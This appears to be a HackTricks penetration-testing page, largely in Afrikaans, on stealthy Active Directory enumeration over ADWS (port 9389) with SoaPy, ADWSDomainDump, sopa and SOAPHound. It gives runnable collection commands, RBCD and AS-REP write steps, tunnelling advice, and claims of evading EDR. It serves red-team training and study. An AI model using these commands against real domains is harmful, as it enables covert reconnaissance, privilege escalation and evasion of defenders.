# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## Wat is ADWS?

Active Directory Web Services (ADWS) is **standaard aangeskakel op elke Domain Controller sedert Windows Server 2008 R2** en luister op TCP **9389**. Ten spyte van die naam, **geen HTTP is betrokke nie**. In plaas daarvan gee die diens toegang tot LDAP-styl data via 'n stapel eie .NET framing-protokolle:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Omdat die verkeer binne hierdie binêre SOAP-frames ingekapsuleer is en oor 'n minder algemene poort beweeg, is **enumeration through ADWS far less likely to be inspected, filtered or signatured than classic LDAP/389 & 636 traffic**. Vir operateurs beteken dit:

* Stealthier recon – Blue teams dikwels konsentreer op LDAP-queries.
* Vryheid om van **non-Windows hosts (Linux, macOS)** te versamel deur 9389/TCP deur 'n SOCKS-proxy te tunnel.
* Dieselfde data wat jy via LDAP sou kry (users, groups, ACLs, schema, ens.) en die vermoë om **writes** uit te voer (bv. `msDs-AllowedToActOnBehalfOfOtherIdentity` vir **RBCD**).

ADWS-interaksies word geïmplementeer oor WS-Enumeration: elke navraag begin met 'n `Enumerate` boodskap wat die LDAP-filter/attribuut definieer en 'n `EnumerationContext` GUID teruggee, gevolg deur een of meer `Pull` boodskappe wat tot die server-gedefinieerde resultaatvenster stroom. Contexts verval na ~30 minute, dus moet gereedskap resultate pagineer of filters opsplits (prefix queries per CN) om te verhoed dat staat verloor word. Wanneer vir security descriptors gevra word, spesifiseer die `LDAP_SERVER_SD_FLAGS_OID` control om SACLs uit te laat, anders val ADWS eenvoudig die `nTSecurityDescriptor` attribuut uit sy SOAP-antwoord.

> LET WEL: ADWS word ook deur baie RSAT GUI/PowerShell tools gebruik, so verkeer kan met wettige admin-aktiwiteit meng.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) is 'n **volle her-implementering van die ADWS-protokolstapel in suiwer Python**. Dit bou die NBFX/NBFSE/NNS/NMF frames byte-vir-byte, wat versameling vanaf Unix-agtige stelsels toelaat sonder om die .NET-runtime aan te raak.

### Sleutelkenmerke

* Ondersteun **proxying through SOCKS** (nuttig vanaf C2 implants).
* Fynkorrelige soekfilters identies aan LDAP `-q '(objectClass=user)'`.
* Opsionele **write**-operasies ( `--set` / `--delete` ).
* **BOFHound output mode** vir direkte inname in BloodHound.
* `--parse` vlag om timestamps / `userAccountControl` te verfraai wanneer menslike leesbaarheid benodig word.

### Targeted collection flags & write operations

SoaPy kom met gekeurde skakelaars wat die mees algemene LDAP hunting-take oor ADWS repliseer: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus raw `--query` / `--filter` knoppies vir pasgemaakte pulls. Kombineer dit met write-primitives soos `--rbcd <source>` (stel `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging for targeted Kerberoasting) en `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Voorbeeld targeted SPN hunt wat slegs `samAccountName` en `servicePrincipalName` teruggee:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Gebruik dieselfde host/credentials om bevindinge onmiddellik te bewapen: dump RBCD-capable objects met `--rbcds`, en pas dan `--rbcd 'WEBSRV01$' --account 'FILE01$'` toe om 'n Resource-Based Constrained Delegation chain op te stel (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) vir die volledige misbruikpad).

### Installasie (operator host)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump oor ADWS (Linux/Windows)

* Fork van `ldapdomaindump` wat LDAP-opvraginge ruil vir ADWS-aanroepe op TCP/9389 om LDAP-signature hits te verminder.
* Voer 'n aanvanklike bereikbaarheidstoets na 9389 uit tensy `--force` gespesifiseer word (slaan die probe oor as port scans lawaaierig/gefilter is).
* Getoets teen Microsoft Defender for Endpoint en CrowdStrike Falcon met 'n suksesvolle bypass in die README.

### Installasie
```bash
pipx install .
```
### Gebruik
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
Tipiese uitset registreer die 9389 bereikbaarheidstoets, ADWS bind, en dump begin/einde:
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - 'n praktiese kliënt vir ADWS in Golang

Net soos soapy, [sopa](https://github.com/Macmod/sopa) implementeer die ADWS-protokoolstapel (MS-NNS + MC-NMF + SOAP) in Golang en bied opdragreëlvlae om ADWS-oproepe uit te voer soos:

* **Objek-soektog & ophaling** - `query` / `get`
* **Objek-lewenssiklus** - `create [user|computer|group|ou|container|custom]` en `delete`
* **Attribuutredigering** - `attr [add|replace|delete]`
* **Rekeningbestuur** - `set-password` / `change-password`
* en ander soos `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, ens.

## SOAPHound – Hoë-volume ADWS-versameling (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) is 'n .NET-versamelaar wat alle LDAP-interaksies binne ADWS hou en BloodHound v4-kompatibele JSON uitstuur. Dit bou een keer 'n volledige kas van `objectSid`, `objectGUID`, `distinguishedName` en `objectClass` (`--buildcache`), en hergebruik dit dan vir hoë-volume `--bhdump`, `--certdump` (ADCS), of `--dnsdump` (AD-geïntegreerde DNS) passe sodat slegs ~35 kritieke attributte die DC verlaat. AutoSplit (`--autosplit --threshold <N>`) verdeel outomaties navrae volgens CN-voorvoegsel om onder die 30-minute EnumerationContext timeout te bly in groot foreste.

Tipiese werkvloei op 'n domein-gekoppelde operator-VM:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Geëxporteerde JSON-lêers direk in SharpHound/BloodHound-werkvloei—see [BloodHound methodology](bloodhound.md) for downstream graphing ideas. AutoSplit maak SOAPHound veerkragtig op multi-miljoen objek-bosse terwyl dit die navraagtelling laer hou as ADExplorer-styl snapshots.

## Stealth AD-versamelings-werkvloei

Die volgende werkvloei wys hoe om **domain & ADCS objects** oor ADWS te enumereer, dit na BloodHound JSON om te skakel en te soek na sertifikaat-gebaseerde aanvalspaaie – alles vanaf Linux:

1. **Tunnel 9389/TCP** vanaf die teiken-netwerk na jou toestel (bv. via Chisel, Meterpreter, SSH dynamic port-forward, ens.).  Export `export HTTPS_PROXY=socks5://127.0.0.1:1080` of gebruik SoaPy’s `--proxyHost/--proxyPort`.

2. **Collect the root domain object:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Versamel ADCS-verwante objekke uit die Configuration NC:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Omskep na BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Laai die ZIP op** in die BloodHound GUI en voer cypher queries soos `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` uit om sertifikaat-eskalasiepaaie (ESC1, ESC8, ens.) te openbaar.

### Skryf na `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Kombineer dit met `s4u2proxy`/`Rubeus /getticket` vir 'n volledige **Resource-Based Constrained Delegation** chain (sien [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Opsomming van Gereedskap

| Doel | Gereedskap | Nota's |
|---------|------|-------|
| ADWS enumeration | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| High-volume ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Cert compromise | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |
| ADWS enumeration & object changes | [sopa](https://github.com/Macmod/sopa) | Generic client to interface with known ADWS endpoints - allows for enumeration, object creation, attribute modifications, and password changes |

## Verwysings

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
